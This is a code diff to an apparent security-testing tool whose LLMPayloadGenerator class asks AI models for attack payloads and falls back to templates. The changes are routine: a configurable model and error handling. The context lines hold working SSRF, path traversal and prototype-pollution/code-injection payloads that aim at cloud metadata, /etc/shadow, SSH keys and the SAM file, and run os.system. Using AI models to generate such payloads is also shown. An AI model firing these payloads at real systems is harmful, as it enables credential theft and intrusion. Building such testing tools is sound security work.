@@ -16,6 +16,7 @@ class LLMPayloadGenerator:
         self.api_key = config.get('api_key')
         self.client = None
         self.provider = None
+        self.model = config.get('model', 'claude-3-5-sonnet-20241022')
         
         if self.enabled and self.api_key:
             # Detect provider by key prefix
@@ -110,28 +111,39 @@ class LLMPayloadGenerator:
             try:
                 if self.provider == 'anthropic':
                     response = self.client.messages.create(
-                        model="claude-3-5-sonnet-20241022",
+                        model=self.model,
                         max_tokens=500,
                         messages=[{"role": "user", "content": prompt}]
                     )
+                    if not response.content:
+                        raise ValueError("Empty response from Anthropic")
                     content = response.content[0].text
                 elif self.provider == 'gemini':
                     response = self.client.generate_content(prompt)
+                    if not response.text:
+                        raise ValueError("Empty response from Gemini")
                     content = response.text
                 elif self.provider == 'openrouter':
                     response = self.client.chat.completions.create(
                         model="meta-llama/llama-3.1-8b-instruct:free",
                         messages=[{"role": "user", "content": prompt}]
                     )
+                    if not response.choices:
+                        raise ValueError("Empty response from OpenRouter")
                     content = response.choices[0].message.content
                 else:
                     raise ValueError(f"Unknown provider: {self.provider}")
                 
+                if not content:
+                    raise ValueError("Empty content from LLM")
                 payloads = json.loads(content)
                 if isinstance(payloads, list):
                     return payloads[:10]
-            except Exception as e:
-                logger.warning(f"LLM generation failed: {e}, using templates")
+                raise ValueError("LLM response is not a list")
+            except (ValueError, KeyError, AttributeError, json.JSONDecodeError) as e:
+                logger.warning("LLM generation failed: %s, using templates", e)
+            finally:
+                response = None
         
         # Fallback to templates
         seed = hash(prompt) % 1000
@@ -146,22 +158,22 @@ class LLMPayloadGenerator:
             ],
             'ssrf': [
                 f"http://169.254.169.254/latest/meta-data/{seed}",
-                f"file:///proc/self/environ",
+                "file:///proc/self/environ",
                 f"http://localhost:6379/SET{seed}",
                 f"gopher://127.0.0.1:25/_{seed}",
-                f"dict://localhost:11211/stat"
+                "dict://localhost:11211/stat"
             ],
             'traversal': [
-                f"....//....//etc/passwd",
-                f"..%252f..%252f..%252fetc/shadow",
-                f"..;/..;/..;/root/.ssh/id_rsa",
-                f"/proc/self/cwd/../../../etc/hosts",
-                f"\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"
+                "....//....//etc/passwd",
+                "..%252f..%252f..%252fetc/shadow",
+                "..;/..;/..;/root/.ssh/id_rsa",
+                "/proc/self/cwd/../../../etc/hosts",
+                "\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"
             ],
             'schema_pollution': [
                 f"__proto__[polluted_{seed}]=1",
                 f"constructor.prototype.{seed}=true",
-                f"__class__.__init__.__globals__[os].system('id')",
+                "__class__.__init__.__globals__[os].system('id')",
                 f"{{__import__('os').system('{seed}')}}"
             ]
         }
